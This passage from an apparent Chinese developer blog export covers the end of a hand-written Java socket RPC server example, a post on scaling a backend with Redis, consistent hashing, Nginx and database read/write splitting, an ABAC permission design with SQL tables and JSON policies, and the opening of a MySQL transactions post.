        <span class="token keyword">this</span><span class="token punctuation">.</span>registeredService <span class="token operator">=</span> registeredService<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 从Socket中获取输入流 与 输出流，这里使用的对象流，也就是要序列化操作</span>
            <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 1、Transfer层获取到RpcRequest消息【transfer层】  含有header 和 body</span>
            <span class="token class-name">RpcRequest</span> rpcRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RpcRequest</span><span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 2、解析版本号，并判断【protocol层】</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"version=1"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>rpcRequest<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

                <span class="token comment">// 3、将rpcRequest中的body部分解码出来变成RpcRequestBody【codec层】</span>
                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> rpcRequest<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ByteArrayInputStream</span> bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 接口名，方法名，参数，参数类型</span>
                <span class="token class-name">RpcRequestBody</span> rpcRequestBody <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RpcRequestBody</span><span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment">// 从注册的服务中，找到对应的接口名  这里是用到了反射</span>
                <span class="token class-name">Object</span> service <span class="token operator">=</span> registeredService<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>rpcRequestBody<span class="token punctuation">.</span><span class="token function">getInterfaceName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Method</span> method <span class="token operator">=</span> service<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>rpcRequestBody<span class="token punctuation">.</span><span class="token function">getMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rpcRequestBody<span class="token punctuation">.</span><span class="token function">getParamTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              	<span class="token comment">// 通过反射，获取对象，方法，然后得到结果</span>
                <span class="token class-name">Object</span> returnObject <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> rpcRequestBody<span class="token punctuation">.</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment">// 1、将结果编码成bytes[]即变成了返回编码【codec层】</span>
                <span class="token class-name">RpcResponseBody</span> rpcResponseBody <span class="token operator">=</span> <span class="token class-name">RpcResponseBody</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token punctuation">.</span><span class="token function">retObject</span><span class="token punctuation">(</span>returnObject<span class="token punctuation">)</span>
                        <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
                oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>rpcResponseBody<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment">// 2、将返回编码作为body，加上header，生成RpcResponse协议【protocol层】</span>
                <span class="token class-name">RpcResponse</span> rpcResponse <span class="token operator">=</span> <span class="token class-name">RpcResponse</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"version=1"</span><span class="token punctuation">)</span>
                        <span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
                        <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              
                <span class="token comment">// 3、发送【transfer层】</span>
                objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>rpcResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
                objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> <span class="token operator">|</span> <span class="token class-name">NoSuchMethodException</span> <span class="token operator">|</span> <span class="token class-name">IllegalAccessException</span> <span class="token operator">|</span> <span class="token class-name">InvocationTargetException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        上面就是整体的一个运行流程，至于里面的实例信息可以直接从github上查看，我主要帮助理一下思路，可以说是不停的debug，这里我遇到了一个比较坑的点：动态代理的invoke方法在debug时候会出现各种莫名奇妙的问题，你直接取消下图的按钮，就可以正常执行了。<img src="../..//typora-user-images/image-20220920141753163.png" alt="image-20220920141753163"></p>
<blockquote>
<p>总结：</p>
</blockquote>
<p>​        我们可以看到当在我们最后一块儿手写RPC时，真正干活的对象并没有分离为一个服务，而是将它放入了服务端的一个Map中，当请求过来时，对请求进行处理，找到需要执行的接口，从Map中看有没有该接口实例，如果有则进行执行，执行结果再通过Socket进行回传。</p>
<p>​        这里的案例我是照搬<code>汤姆还在写代码</code>的，从中我知道了可以通过自定义RPC简单协议来通过Socket进行信息交互，真的很酷，这样看其实各个协议离我们并不遥远，我们也可以自己去定义，通过Map来存储各个服务，虽然不知道真实的Zookeeper是怎么实现的，但应该原理是类似的。后面我可能再去看看grpc的实现，应该能发现更多的东西。</p>
]]></content>
      <categories>
        <category>演化过程系列</category>
      </categories>
      <tags>
        <tag>RPC</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>后端演化过程</title>
    <url>//post/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%90%8E%E7%AB%AF%E9%A3%8E%E4%BA%91.html</url>
    <content><![CDATA[<h1 id="后端风云"><a href="#后端风云" class="headerlink" title="后端风云"></a>后端风云</h1><p>​        本文简单概况了一下刘欣老师的《码农翻身》的后端风云章，这本书强烈推荐给大家，每看一遍都有不同的感觉，通俗易懂且知识面大而全。居家旅行，必备良药！！！</p>
<h2 id="早期初级阶段："><a href="#早期初级阶段：" class="headerlink" title="早期初级阶段："></a>早期初级阶段：</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek1qz02j30ly0bcaal.jpg" alt="image-20220820220959059"></p>
<p>​        在我们早期学习 <code>javaWeb</code>阶段，将订单模块儿，购物车模块儿，支付模块儿都写在了一个项目中，并访问一个Mysql数据库，这在自己练手项目中是没问题的，但如果系统上线，有大量的用户同时访问该系统，Tomcat服务器首先需要考虑能不能支撑住大的并发量（默认150，当超过250时，就应该考虑的服务器的集群），其次是Mysql数据库,在高并发两三千也就差不多了，要知道Mysql数据库读取数据是很慢的操作，它本质是从硬盘中读取文件的。</p>
<h2 id="优化点1-使用缓存"><a href="#优化点1-使用缓存" class="headerlink" title="优化点1:使用缓存"></a>优化点1:使用缓存</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejxz2vfj30kn06raaf.jpg" alt="image-20220820120628253"></p>
<p>可以看到我们给中间加了一个Redis中间件作为缓存，现在服务器需要获取数据，先到缓存中找数据，如果找不到再去Mysql中找数据，找到数据后再写回Redis中，这样下次请求数据可以直接在缓存中获取数据，那缓存的好处是啥，缓存是加载在内存中的，读取数据那肯定是快的多。这样就减轻Mysql数据库的压力。但是如果用户每次请求先去缓存找，如果都没找到，那请求还是落在了Mysql上，这个可能导致缓存击穿，缓存雪崩。</p>
<blockquote>
<p>提问：如果数据库中数据修改了，但是缓存中还是之前的数据该怎么办？</p>
<p>为了保证数据的一致性下面的方案是否可行？</p>
<ol>
<li>先更新数据库中，再更新缓存</li>
<li>先删除缓存，再更新数据库</li>
<li>先更新数据库，再删缓存</li>
<li>数据设置过期时间</li>
</ol>
<p>这里参考文章：<a href="https://blog.csdn.net/diweikang/article/details/94406186">https://blog.csdn.net/diweikang/article/details/94406186</a></p>
</blockquote>
<h2 id="优化点2-多台缓存"><a href="#优化点2-多台缓存" class="headerlink" title="优化点2:多台缓存"></a>优化点2:多台缓存</h2><p>之前我们在服务器与数据库中间加上一个缓存，来减轻数据库的压力，和提高数据读取速度，但如果只有一台缓存，后期也会因为内存用完而耗尽，缓存要是挂机了，又是数据库直面大量请求了，那我们多部署几个缓存服务器来分摊一下压力。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek34irtj30pc09ugmh.jpg" alt="image-20220820131146797"></p>
<p>当部署多个缓存服务器时，又出现问题了，我读取和存放数据的时候，我用哪个服务器啊，我们先不说具体用啥算法，我们先想想我们需要啥？</p>
<ol>
<li>我存的地方和我找的地方得一致，不能我存在缓存1，结果去缓存3找，那肯定是没数据</li>
<li>我存放数据的均匀的落在这三个缓存上，不能说饿的饿死，撑得撑死。</li>
</ol>
<h3 id="余数算法"><a href="#余数算法" class="headerlink" title="余数算法"></a>余数算法</h3><p>最简单：在找数据或者写数据时，先求Hash值，然后对Hash值进行取余，这样可以均匀的将请求落在三个缓存中。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek0ropij30i007z74w.jpg" alt="image-20220820162701218"></p>
<p>​        缺点也很明显：之前我用三个缓存好好的，数据存储的也没问题，现在要再加一个缓存，那现在读数据和写数据取余可就变成4了，之前的数据可就都访问不到了，请求一下子又干到数据库了</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejv7pnhj30n507qgmi.jpg" alt="image-20220820162729067"></p>
<h3 id="一致性Hash算法"><a href="#一致性Hash算法" class="headerlink" title="一致性Hash算法"></a>一致性Hash算法</h3><p>一致性Hash算法不能完全的解决这个问题，但是可以做到大部分数据可以照常工作</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek2n3qfj30j70c174f.jpg" alt="image-20220820163202097"></p>
<p>​        比方说我们在这个圆上标注 <code>0-2^32-1</code>个点，三台redis服务器均匀的落在这个图上，当有数据要查找或插入时，还是先取Hash值，使落在这个圆的范围上，如果超出了那就取余。比方说这是插入的这个点落在了A到B之前的位置，那就让它顺时针找它最近的那个服务器点，数据存放在那里，这时候就找到了B，如果是落在了C到A的范围，那还是顺时针走，走到A的位置。</p>
<p>​        假如说突然又添加了一个服务器D，假如插在了B和C之间。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek18qiqj30i70c374j.jpg" alt="image-20220820163842694"></p>
<p>​        那么现在要查询数据时，点位落在了B到C之前，原来是到C去读取数据，现在就看是不是在B和D之间了，如果在这之间那就去D找，如果落在了D到C之间，那还是去C找。这时候就发现到D找的数据肯定是找不到的，但是其他区域的数据都不会被影响到啊，这样就避免了全部缓存穿透导致的缓存雪崩。</p>
<blockquote>
<p>这里的一个前提条件就是服务器经过Hash计算后需要均匀的落在这个区间内，否则就会有部分的缓存负责过高，有的负载过低，也就是<code>数据倾斜</code></p>
</blockquote>
<p>​        比方说我们个人开发的小项目，就用两个缓存服务器，那这么大的一个圆就放两个点，可能导致数据都集中到了一个服务器上，导致压力过大</p>
<blockquote>
<p>解决这个问题的办法有：<code>虚拟服务器（虚拟节点映射）</code></p>
</blockquote>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejvpj1aj30lg0iemys.jpg" alt="image-20220820165011054"></p>
<p>就是将一个真实服务器看做成多态虚拟的服务器，均匀的分布到圆上。</p>
<p>保证数据均匀的存放在真实的缓存服务器上</p>
<h3 id="Hash槽算法"><a href="#Hash槽算法" class="headerlink" title="Hash槽算法"></a>Hash槽算法</h3><p>槽可以理解为分区，数据都是存放在分区中的，然后分区与机器进行动态绑定。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejyvqptj30m906sgm7.jpg" alt="image-20220820200524038"></p>
<p>​        比方说现在要存储(Key,Value),先对Key求Hash值，然后对16384求余数，看到余数落在那个槽位，就放到哪个服务器。是不是感觉第三种算法和余数算法和一致性Hash算法都有点儿像，类似于一个综合的算法</p>
<p>​        那假如我现在要新增一个节点怎么办，现在有三个服务器，假如再来一个服务器4，就从服务器1，服务器2，服务器3中各取出一部分槽和数据。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejyfi27j30ml0b5759.jpg" alt="image-20220820201220590"></p>
<p>​        那相应的我请求请求的时候选择哪个节点，这里客户端可以向任意一个节点发送请求，例如：get(key1)这个请求我发送给了服务器1，但是数据是在服务器2，则服务器会将请求重定向到服务器2。这也叫做<code>Redis Cluster</code></p>
<blockquote>
<p>为什么redis集群不采用一致性哈希算法？</p>
</blockquote>
<p>​        一个直观的区别就是一致性Hash，无法很好的控制数据的分布，比方说我是有几个服务器，但是各个硬件条件并不一样，想让配置比较好的多放一些数据，配置差点儿的就少部署一些，可以做到精确控制。</p>
<h2 id="优化点3-故障转移"><a href="#优化点3-故障转移" class="headerlink" title="优化点3:故障转移"></a>优化点3:故障转移</h2><p>​        比方说我原先有三个缓存服务器，每个服务器负责一部分Hash槽，假如这时候一个服务器挂了，那这部分数据就算丢失了，这部分的请求也就又干到数据库了，现在我们利用Redis提供的 <code>master-slave</code>功能，就是一个大哥带几个小弟，如果大哥被干掉了，小弟中一个人就去当大哥管事儿。大哥与小弟之前的数据是同步的，以确保小弟可以顺利的继位</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek4j9zfj30n50f00u4.jpg" alt="image-20220820205141078"></p>
<h2 id="优化点4-高可用的Tomcat"><a href="#优化点4-高可用的Tomcat" class="headerlink" title="优化点4:高可用的Tomcat"></a>优化点4:高可用的Tomcat</h2><p>​        在文章的最开始我们就说了Tomcat默认支持的并发量并不大，且如果它挂掉了，那完蛋了，服务直接用不了了，所以索性我们学习一下Redis，多部署几个Tomcat服务器，让请求均摊到各个Tomcat服务器之间，这样就可以有效的降压，如果有一个服务器挂了，其他的服务器还能继续干。</p>
<blockquote>
<p>问题：Tomcat的Session信息是不能服务共享的，假如用户A在Tomcat服务器1上进行登陆了，并将登陆信息保存在Session中，现在用户又请求了，被轮训到了服务器2上，但是服务器2是没有该用户的Session信息的，这又得让用户去登陆</p>
</blockquote>
<p>可以使用Redis缓存来处理。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejzumt3j30f80a574n.jpg" alt="image-20220820211730816"></p>
<h2 id="优化点5-使用Nginx"><a href="#优化点5-使用Nginx" class="headerlink" title="优化点5:使用Nginx"></a>优化点5:使用Nginx</h2><p>其实在之前我一直对Nginx都是懵逼状态，明明可以直接访问Tomcat，为啥要中间加一个Nginx。我对Nginx最直观的使用就是通过端口去访问服务器静态文件，去做个人博客，但现在按照我们优化点4所说的部署多个Tomcat服务器，那前端到底访问哪个Tomcat呢？总不能写死到前端代码里去轮询吧，如果我们在中间加一个Nginx去做代理，就会舒服的多。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejx1jhgj30s00agdgt.jpg" alt="image-20220820212437837"></p>
<p>这里我就不说文绉绉的定义了，可以去官网上查</p>
<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejw7k9mj30jm0eujsa.jpg" alt="image-20220820212745193"></p>
<p>​        这里说一个例子就行了，VPN翻墙，你想访问国外网址，但是电脑受国内管控，无法访问，那就需要一个代理，你请求代理，代理请求国外服务器，然后数据返回。</p>
<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek2729wj30jt0dmab1.jpg" alt="image-20220820213214154"></p>
<p>比方说我们现在上网搜索<a href="http://www.baidu.com,我们只知道这个域名,但实际上它可能只是一个代理,真实的请求是转发到内部的其他服务,这样也可以保护真实的服务器.和正向代理的区别是,正向代理是知道我要找谁,反向代理是我也不知道谁真实的服务./">www.baidu.com,我们只知道这个域名，但实际上它可能只是一个代理，真实的请求是转发到内部的其他服务，这样也可以保护真实的服务器。和正向代理的区别是，正向代理是知道我要找谁，反向代理是我也不知道谁真实的服务。</a></p>
<h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>就是将请求均匀的发送到各个服务器间</p>
<p>其中有轮训方式</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek50a64j30h70by3z5.jpg" alt="image-20220820213520428"></p>
<p>有权重方式</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek3l5l8j30jx0d9dgq.jpg" alt="image-20220820213640770"></p>
<h3 id="动静分离"><a href="#动静分离" class="headerlink" title="动静分离"></a>动静分离</h3><p>很直观的，我们可以通过Nginx直接访问静态文件。那Tomcat也可以访问静态文件啊，但是低，且一般Tomcat是作为业务逻辑服务器的，如果将动态资源和静态资源都放在Tomcat中，就会消耗额外的一部分性能，</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejxhy9fj30k80c9mxr.jpg" alt="image-20220820214118620"></p>
<h3 id="高可用的Nginx"><a href="#高可用的Nginx" class="headerlink" title="高可用的Nginx"></a>高可用的Nginx</h3><p>​        我们已经发现如果一条链路中如果某个地方只有一个工作的，那一旦它挂机了，后续工作都无法进行了。所以按照之前的设计我们再部署一个Nginx服务器，但是与Tomcat不同的是，Nginx是直面客户端的，所以即使是多个服务，对外也只能暴露一个Ip地址，从外面看就只有一个服务，通过 <code>Keepalived</code>将多个Nginx服务形成<code>master-slave</code>关系，一个挂了，另一个补上，那我们的结构图又得更新了。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejut0lgj30sm09ejsf.jpg" alt="image-20220820214735780"></p>
<h2 id="优化点6-数据库的读写分离"><a href="#优化点6-数据库的读写分离" class="headerlink" title="优化点6:数据库的读写分离"></a>优化点6:数据库的读写分离</h2><p>​        我们看上面的系统架构图后发现似乎就剩数据库是孤家寡人了，但如果把数据多部署几个，如果每个都可以进行读写操作，那服务之间的数据一致性就很难再确定了，而对数据库的大部分操作都是读操作，写操作相比要少的多。而且我们都知道数据库的共享锁和写锁互斥，这也是影响效率的，如果能分开的话，速度方面，安全方面肯定更稳健。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek0a4fcj30cu0c3gm3.jpg" alt="image-20220820215503380"></p>
<p>假如有一天master挂掉了，那在剩余的slave中选一个，是不是就发现，多服务部署的思想很多都是一样的。就是为了保证高可用性。</p>
<blockquote>
<p>但是Tomcat可就犯难了，难倒我每次请求前都判断一下是读操作还是写操作，再根据不同的类型，发送不同的数据库吗？</p>
</blockquote>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejwlg47j30gs09i3z1.jpg" alt="image-20220820215954215"></p>
<h3 id="使用MySQL-Proxy"><a href="#使用MySQL-Proxy" class="headerlink" title="使用MySQL Proxy"></a>使用MySQL Proxy</h3><p>发挥我们抽象的大脑，只要有这种不属于我们应该管的事，我们就把活儿抛出去，我们再增加一个抽象层。将这些脏活累活统一交给Mysql Proxy去管理</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejzd2b8j30h60dzt9l.jpg" alt="image-20220820220324413"></p>
<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>我们的系统已经可见性的复杂的多了，但为了保证服务不会突然挂掉了，这些也是必须的。至于后期还有更多的优化，例如ES，MQ，熔断降级，分布式注册中心，配合中心，等各种骚操作后面再不断加呗，一口吃不成胖子。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek414svj30jr0f4gmy.jpg" alt="image-20220820220832414"></p>
]]></content>
      <categories>
        <category>演化过程系列</category>
      </categories>
  </entry>
  <entry>
    <title>ABAC权限设计</title>
    <url>//post/%E6%95%B0%E6%8D%AE%E5%BA%93/ABAC%E6%9D%83%E9%99%90%E8%AE%BE%E8%AE%A1.html</url>
    <content><![CDATA[<p>这里我使用ABAC理论来设计：</p>
<h2 id="数据库表设计"><a href="#数据库表设计" class="headerlink" title="数据库表设计"></a>数据库表设计</h2><ul>
<li><p>用户属性：</p>
<ul>
<li>```sql<br>CREATE TABLE User<br>(<br>userId int,<br>userName varchar(100),<br>roleId int<br>);<pre class="line-numbers language-none"><code class="language-none">  
- 环境属性
  - &#96;&#96;&#96;sql
    CREATE TABLE Role
    (
    roleId int,
    roleName varchar(100)  # 比如：普通用户，付费用户，积分等级 
    );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
<li><p>操作属性：</p>
<ul>
<li>```sql<br>CREATE TABLE <code>action</code><br>(<br>actionId int,<br>actionName varchar(100)  # 比如：read读，write评论<br>);<pre class="line-numbers language-none"><code class="language-none">  
  - 试读
  
  - 付费读
  
  - 免费读
  
  - 评论
  
- Resources属性：
  - &#96;&#96;&#96;sql
    CREATE TABLE module  # 我们最终操作的资源，例如查看的文章，数据
    (
    moduleId int,
    moduleName varchar(100),  # 比如：Java基础模块儿，Java高级模块儿 
    moduleTitle varchar(50),  # 模块儿的标题   这里就可以通过Policy来自定义控制展示
    moduleDes varchar(255),   # 模块儿的描述
    moduleContent text        # 模块儿具体的内容
    );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
<li><p>Policy策略：</p>
<ul>
<li>```sql<br>CREATE TABLE policy # 这里定义我们的权限控制方案<br>(<br>policyId int,<br>policyDetail varchar(255),  # 在下面我们将给出示例<br>policyStatus tinyint        # 策略状态，例如禁用，启用<br>);<pre class="line-numbers language-none"><code class="language-none">  
- Policy 与 Resources 关联表，

  - 其中一个资源可能有多个策略，比如针对资源普通用户一种策略，付费用户一种策略，这取决于我们Policy如何解析，是否加入or的操作
  - 一个策略可能也针对多个资源生效


定义不同的Policy，

- Java模块儿下文章免费读取或评论

&#96;&#96;&#96;json
&#123;
  &quot;effect&quot;:&quot;Allow&quot;, 
  &quot;actions&quot;:[
    &quot;read&quot;,&quot;write&quot;
  ],
  &quot;resources&quot;:[
    &quot;Module:java:article:*&quot;,
  ]
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
<li><p>这里表示 非vip用户，可以读取Java模块儿下文章的标题和描述，其中condition相当于条件，也可以定义多种条件</p>
</li>
</ul>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"effect"</span><span class="token operator">:</span><span class="token string">"Allow"</span><span class="token punctuation">,</span> 
  <span class="token property">"actions"</span><span class="token operator">:</span><span class="token punctuation">[</span>
    <span class="token string">"read"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"resources"</span><span class="token operator">:</span><span class="token punctuation">[</span>
    <span class="token string">"Module:java:article:title"</span><span class="token punctuation">,</span>
    <span class="token string">"Module:java:article:description"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"condition"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"isVip:0"</span><span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过Policy可以控制，哪些资源可以哪些用户访问，其中普通用户能访问什么，访问多少，具体展示可以在Resources中控制。而Resoures与Policy做关联。</p>
<h2 id="大体流程"><a href="#大体流程" class="headerlink" title="大体流程"></a>大体流程</h2><p>​         用户登录时，后台将用户信息保存到Session中，当用户想要访问某个资源时并进行操作时，后台读取该资源对应的策略，然后通过Session中保存的用户数据与对应的策略进行计算对比，看是否可以授权，如果授权通过，则只能读取到策略规定的访问内容，封装并返回，前端根据信息来展示对应的内容。</p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><ol>
<li>Policy内容格式进行规范统一</li>
<li>需要写一个解析器，来解析Policy的内容</li>
<li>资源与策略的对应关系与策略本身可以写入Redis中，快速读取和校验</li>
</ol>
<p>​       这里的想法是我查阅ABAC理论的思路，之前并未使用过，不过自己推断的流程应该是行的通的，策略与角色之间分离，如果未来有更多的权限管理，只需要修改或加入新的策略，也更灵活。</p>
]]></content>
      <categories>
        <category>权限设计</category>
      </categories>
      <tags>
        <tag>权限设计</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql的事务与索引</title>
    <url>//post/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql%E7%9A%84%E4%BA%8B%E5%8A%A1%E4%B8%8E%E7%B4%A2%E5%BC%95.html</url>
    <content><![CDATA[<h1 id="Mysql事务与索引"><a href="#Mysql事务与索引" class="headerlink" title="Mysql事务与索引"></a>Mysql事务与索引</h1><blockquote>
<p>​    需求：先从数据库中读取一个字段的值，然后修改该字段，由于操作不是原子性，无法保证线程安全，也就是当A线程读取值为1时，想在原有基础上+1，赋值为2。而B线程已经将数据修改为2了，那么A线程应该是在2的基础上+1，赋值为3。但实际中可能该值都到8了，A又给人家改回2了。所以我们该如何解决数据安全问题？</p>
</blockquote>
<ol>
<li>本能想到利用JVM层面的锁机制，保证每次只有一个线程进行操作，但这个性能太差，而且JVM锁无法在分布式中生效。</li>
<li>利用数据库事务操作，下文我们主要讲Mysql事务的知识。</li>
</ol>
<h2 id="数据库事务"><a href="#数据库事务" class="headerlink" title="数据库事务"></a>数据库事务</h2><p>​    在讲事务之前，我们需要明确Mysql中只有<code>Inndb存储引擎</code>支持事务，如果是其他存储引擎则无法使用事务，所以我们应先检查自己的存储引擎是否正确。</p>
<ol>
